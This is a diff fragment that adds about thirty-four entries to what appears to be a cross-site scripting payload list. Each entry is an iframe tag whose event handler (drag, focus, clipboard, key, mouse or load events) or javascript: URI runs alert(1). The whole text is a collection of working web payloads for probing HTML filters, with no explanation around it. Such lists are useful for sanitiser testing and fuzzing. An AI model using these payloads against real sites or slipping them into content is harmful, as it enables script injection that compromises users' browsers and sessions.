@@ -17,3 +17,37 @@
 <iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
 <iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
 <iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
+<iframe draggable="true" ondrag="alert(1)">test</iframe>
+<iframe draggable="true" ondragend="alert(1)">test</iframe>
+<iframe draggable="true" ondragenter="alert(1)">test</iframe>
+<iframe draggable="true" ondragleave="alert(1)">test</iframe>
+<iframe draggable="true" ondragstart="alert(1)">test</iframe>
+<iframe id=x onfocus=alert(1)>
+<iframe id=x onfocusin=alert(1)>
+<iframe id=x tabindex=1 onactivate=alert(1)></iframe>
+<iframe id=x tabindex=1 onbeforeactivate=alert(1)></iframe>
+<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>
+<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>
+<iframe onbeforecopy="alert(1)" contenteditable>test</iframe>
+<iframe onbeforecut="alert(1)" contenteditable>test</iframe>
+<iframe onbeforepaste="alert(1)" contenteditable>test</iframe>
+<iframe onblur=alert(1) id=x><input autofocus>
+<iframe onclick="alert(1)">test</iframe>
+<iframe oncontextmenu="alert(1)">test</iframe>
+<iframe oncopy="alert(1)" contenteditable>test</iframe>
+<iframe oncut="alert(1)" contenteditable>test</iframe>
+<iframe ondblclick="alert(1)">test</iframe>
+<iframe onfocusout=alert(1) id=x><input autofocus>
+<iframe onkeydown="alert(1)" contenteditable>test</iframe>
+<iframe onkeypress="alert(1)" contenteditable>test</iframe>
+<iframe onkeyup="alert(1)" contenteditable>test</iframe>
+<iframe onload=alert(1)></iframe>
+<iframe onmousedown="alert(1)">test</iframe>
+<iframe onmouseenter="alert(1)">test</iframe>
+<iframe onmouseleave="alert(1)">test</iframe>
+<iframe onmousemove="alert(1)">test</iframe>
+<iframe onmouseout="alert(1)">test</iframe>
+<iframe onmouseover="alert(1)">test</iframe>
+<iframe onmouseup="alert(1)">test</iframe>
+<iframe onpaste="alert(1)" contenteditable>test</iframe>
+<iframe onreadystatechange=alert(1)></iframe>
